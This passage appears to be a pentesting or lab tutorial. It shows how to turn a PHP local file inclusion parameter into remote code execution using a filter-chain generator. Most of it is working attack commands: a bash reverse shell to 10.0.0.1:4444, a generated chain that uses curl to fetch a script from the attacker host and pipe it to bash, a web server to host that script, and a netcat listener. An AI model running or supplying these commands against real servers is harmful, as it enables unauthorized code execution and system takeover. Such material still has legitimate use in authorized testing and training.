python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'

We only have to do is paste the above generated payload to /?page=<genrated_chain>.
Reverse Shell

First create a shell script named "revshell" in local machine.

bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

Then create a chain using a generator.
Replace the ip address with your own.

# `<?= ?>` is a shorthand for `<?php echo ~ ?>`
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/revshell|bash` ?>'

We need to start a web server that hosts the shell script, and also start a listener for receiving the reverse connection.

# terminal 1
sudo python3 -m http.server 80

# terminal 2
nc -lvnp 4444
